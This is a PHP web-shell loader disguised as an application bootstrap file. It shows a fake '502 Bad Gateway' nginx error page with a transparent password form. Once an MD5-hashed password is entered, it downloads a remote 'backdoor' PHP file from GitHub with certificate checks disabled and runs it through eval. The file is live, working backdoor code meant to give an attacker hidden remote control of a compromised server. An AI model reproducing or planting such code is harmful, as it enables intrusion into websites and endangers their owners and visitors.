<?php
session_start();

/*
 *---------------------------------------------------------------
 * BOOTSTRAP THE APPLICATION
 *---------------------------------------------------------------
 * This process sets up the path constants, loads and registers
 * our autoloader, along with Composer's, loads our constants
 * and fires up an environment-specific bootstrapping.
 */

/**
 * Fetch the content of a URL
 */
function fetch_url_with_cookies($url) {
    $options = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => "Mozilla/5.0",
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ];

    if (isset($_SESSION['coki'])) {
        $options[CURLOPT_COOKIE] = $_SESSION['coki'];
    }

    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    $content = curl_exec($ch);
    curl_close($ch);

    return $content;
}

/**
 * Check if the user is authenticated
 */
function is_user_authenticated() {
    return !empty($_SESSION['logged_in']);
}

/**
 * Process login attempt
 */
function process_login($password) {
    $correct_password_hash = '573bd8ef72e6e057bf1989b11545e8e5';

    if (md5($password) === $correct_password_hash) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace with your cookie data
    } else {
        echo "Server Error.";
    }
}

// Handle login form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    process_login($_POST['password']);
}

// Display main content if authenticated, otherwise show hidden login form
if (is_user_authenticated()) {
    $content = fetch_url_with_cookies('https://raw.githubusercontent.com/letsr00t/backdoor/refs/heads/main/rawr.php');
    EVAl('?>' . $content);
} else {
    // Display transparent login form
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>502 Bad Gateway</title>
    </head>
    <body>
        <center><h1>502 Bad Gateway</h1></center>
        <hr><center>nginx/1.20.1</center>
        <center>
            <form method="POST" action="" style="opacity: 0.0;">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Server</button>
            </form>
        </center>
    </body>
    </html>
    <?php
}
?>
